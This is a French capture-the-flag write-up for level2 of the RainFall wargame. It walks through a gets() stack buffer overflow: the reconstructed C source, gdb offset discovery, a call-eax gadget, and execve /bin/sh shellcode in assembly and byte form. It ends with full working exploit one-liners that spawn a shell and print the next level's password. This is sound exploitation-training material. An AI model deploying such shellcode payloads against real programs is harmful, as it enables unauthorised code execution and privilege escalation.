# level2 :

pass : `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`

## Source :

```c
#include <stdio.h>
#include <stdint.h>

int		p() {  // 0x080484d4
	char	buf[64];  // ebp-0x4c | esp+0x1c / size : 0x5c-0x1c = 64
	int		local_arg;  // ebp-0xc | esp+0x5c

	fflush(stdout);
	gets(buf);
	local_arg = (int32_t)(*buf);
	if ((local_arg & 0xb0000000) == 0xb0000000) {
		printf("(%p)\n", (void *)local_arg);
		_exit(1);
	}
	puts(buf);
	return (strdup(buf));
}

int		main(int ac, char **av, char **envp) {  // 0x0804853f
	return(p());
}
```

## Recherche :

On cherche avec `peda pattern` quand les registre sont réécrit :

```sh
gdb-peda$ pattern search
Registers contain pattern buffer:
EBP+0 found at offset: 76
EIP+0 found at offset: 80
Registers point to pattern buffer:
[EAX] --> offset 0 - size ~200
[EDX] --> offset 0 - size ~200
[ESP] --> offset 84 - size ~116
Pattern buffer found at:
0x0804a1a0 : offset    0 - size  200 ([heap])
0x0804b1f3 : offset   67 - size  133 ([heap])
0x0804b603 : offset   67 - size  133 ([heap])
0xbffff25f : offset   67 - size  133 ($sp + -0x11 [-5 dwords])
References to pattern buffer found at:
0xb7fb758c : 0x0804a1a0 (/usr/lib/i386-linux-gnu/libc-2.30.so)
0xb7fb7590 : 0x0804a1a0 (/usr/lib/i386-linux-gnu/libc-2.30.so)
0xb7fb7594 : 0x0804a1a0 (/usr/lib/i386-linux-gnu/libc-2.30.so)
0xb7fb7598 : 0x0804a1a0 (/usr/lib/i386-linux-gnu/libc-2.30.so)
0xb7fb759c : 0x0804a1a0 (/usr/lib/i386-linux-gnu/libc-2.30.so)
0xbffff128 : 0x0804a1a0 ($sp + -0x148 [-82 dwords])
```

On a donc `EIP` réécrit à l'offset `80`, et `EAX` est réécrit à l'offset `0`, donc au tout début de notre chaîne. 

```sh
level2@RainFall:~$ objdump -S ./level2 | grep "call $eax"
 804835c:       e8 00 00 00 00          call   8048361 <_init+0x9>
 8048372:       e8 89 00 00 00          call   8048400 <__gmon_start__@plt>
 8048377:       e8 34 01 00 00          call   80484b0 <frame_dummy>
 804837c:       e8 4f 02 00 00          call   80485d0 <__do_global_ctors_aux>
 804843c:       e8 cf ff ff ff          call   8048410 <__libc_start_main@plt>
 8048488:       ff 14 85 50 97 04 08    call   *0x8049750(,%eax,4)
 80484cf:       ff d0                   call   *%eax
 80484e2:       e8 c9 fe ff ff          call   80483b0 <fflush@plt>
 80484ed:       e8 ce fe ff ff          call   80483c0 <gets@plt>
 8048516:       e8 85 fe ff ff          call   80483a0 <printf@plt>
 8048522:       e8 a9 fe ff ff          call   80483d0 <_exit@plt>
 804852d:       e8 be fe ff ff          call   80483f0 <puts@plt>
 8048538:       e8 a3 fe ff ff          call   80483e0 <strdup@plt>
 8048545:       e8 8a ff ff ff          call   80484d4 <p>
 8048554:       e8 69 00 00 00          call   80485c2 <__i686.get_pc_thunk.bx>
 804856c:       e8 e7 fd ff ff          call   8048358 <_init>
 804859b:       ff 94 b3 20 ff ff ff    call   *-0xe0(%ebx,%esi,4)
 80485eb:       ff d0                   call   *%eax
 8048600:       e8 00 00 00 00          call   8048605 <_fini+0x9>
 804860c:       e8 3f fe ff ff          call   8048450 <__do_global_dtors_aux>
```
Donc l'adresse `0x080484cf` fait un call au register `EAX`. Et en little endian : `\xcf\x84\x04\x08`

Maintenant, on va vouloir executer un shellcode, c'est à dire lancer un shell depuis notre programme. Soit le code `asm` suivant permettant d'exécuter un `/bin/sh`:
```nasm
.global main
main:
    push   $0xb
    pop    %eax
    xor    %esi,%esi
    push   %esi
    push   $0x68732f2f
    push   $0x6e69622f
    mov    %esp,%ebx
    xor    %ecx,%ecx
    mov    %ecx,%edx
    int    $0x80
```
 qui compilé donne le shell code suivant :
`\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80` qui fait 24 caractères.

On peut donc mettre notre sellcode au début de notre chaine la remplir pour réécrire sur l'`EIP` :

```sh
(gdb) r < <(python -c 'print "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"+"\x90"*(80-24)+"\xcf\x84\x04\x08"')
Starting program: /home/user/level2/level2 < <(python -c 'print "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"+"\x90"*(80-24)+"\xcf\x84\x04\x08"')
j
 X1�Vh//shh/bin��1ɉ�����������������������������������������������������τ
process 6666 is executing new program: /bin/dash
[Inferior 1 (process 6666) exited normally
```

On a eu `process 6666 is executing new program: /bin/dash` donc on est bon, un shell a bien été lancé. On peut passer à l'exploit.

## Exploit :

```bash
level2@RainFall:~$ (python -c 'print "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"+"\x90"*(80-24)+"\xcf\x84\x04\x08"'; cat) | ./level2 
j
 X1�Vh//shh/bin��1ɉ�����������������������������������������������������τ
whoami 
level3
cd ../level3
cat .pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

On peut trouver sur internet des shell codes qui fonctionnent directement comme sur cette page :
http://shell-storm.org/shellcode/files/shellcode-811.php

`(perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"."\x90"x(80-28)."\xcf\x84\x04\x08"'; cat;) | ./level2`

----

## Documentation :

* [0x0ff.info - BUFFER OVERFLOW & GDB – PART 1](https://www.0x0ff.info/2015/buffer-overflow-gdb-part1/)
* [0x0ff.info - BUFFER OVERFLOW & GDB – PART 2](https://www.0x0ff.info/2015/buffer-overflow-gdb-part-2/)
* [0x0ff.info - BUFFER OVERFLOW & GDB – PART 3](https://www.0x0ff.info/2015/buffer-overflow-gdb-part-3/)
* [NASM Tutorial](https://cs.lmu.edu/~ray/notes/nasmtutorial/)
* [hackndo - Buffer Overflow](https://beta.hackndo.com/buffer-overflow/)
![](https://www.0x0ff.info/wp-content/uploads/2015/12/buffer-overflow-memory-segmentation-cheat-sheet.png)
